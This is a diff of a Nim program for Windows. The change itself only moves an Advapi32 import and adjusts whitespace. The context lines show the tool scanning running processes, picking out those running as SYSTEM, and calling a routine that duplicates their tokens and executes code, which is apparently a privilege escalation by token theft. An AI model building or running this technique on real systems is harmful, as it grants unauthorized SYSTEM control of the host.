@@ -10,6 +10,9 @@ let system_sid = "S-1-5-18"
 let isDebug = true
 
 
+proc convertSidToStringSidA(Sid: PSID, StringSir: ptr LPSTR): NTSTATUS {.cdecl, importc: "ConvertSidToStringSidA", dynlib: "Advapi32.dll".}
+
+
 proc SetPrivilege(lpszPrivilege:string): bool=
     # inits
     var tp : TOKEN_PRIVILEGES
@@ -30,12 +33,12 @@ proc SetPrivilege(lpszPrivilege:string): bool=
     # success
     return true
 
-proc convertSidToStringSidA(Sid: PSID, StringSir: ptr LPSTR): NTSTATUS {.cdecl, importc: "ConvertSidToStringSidA", dynlib: "Advapi32.dll".}
 
 proc sidToString(sid: PSID): string =
     var lpSid: LPSTR
     discard convertSidToStringSidA(sid, addr lpSid)
     return $cstring(lpSid)
+
 
 proc isProcessSystem(pid: int): bool =
     var hProcess: HANDLE
@@ -67,7 +70,8 @@ proc isProcessSystem(pid: int): bool =
         isSystem = true
     
     return isSystem
-    
+
+
 proc dupicateAndExecute(pid: int): void =
 
     var is_success: BOOL
@@ -116,6 +120,7 @@ proc dupicateAndExecute(pid: int): void =
     CloseHandle(newToken)
     CloseHandle(hToken)
 
+
 proc main(): void =
     
     # inits
@@ -139,5 +144,6 @@ proc main(): void =
         while Process32Next(hSnapshot, addr entry):
             if isProcessSystem(entry.th32ProcessID):
                 dupicateAndExecute(entry.th32ProcessID)
-            
+
+
 main()
